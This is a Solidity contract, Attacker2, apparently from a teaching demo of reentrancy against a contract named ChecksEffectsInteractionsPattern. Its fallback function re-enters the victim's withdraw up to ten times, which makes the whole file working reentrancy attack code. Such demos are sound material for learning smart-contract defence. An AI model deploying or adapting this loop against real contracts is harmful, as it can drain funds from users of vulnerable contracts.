// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import './ChecksEffectsInteractionsPattern.sol';

contract Attacker2 {
  ChecksEffectsInteractionsPattern v;
  uint256 public count;
  uint amount = 1 ether;
  address payable public victimAddress;

  event LogFallback(uint c, uint balance);

  constructor (ChecksEffectsInteractionsPattern victim) {
    victimAddress = address(victim);
    v = ChecksEffectsInteractionsPattern(victimAddress);
  }

  function setBalance() public payable {
     victimAddress.call{value: msg.value}("");
  }

  function attack() public {
    v.withdraw(amount);
  }

  fallback() external payable {
    count++;

    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw(amount);
    } 
  }
}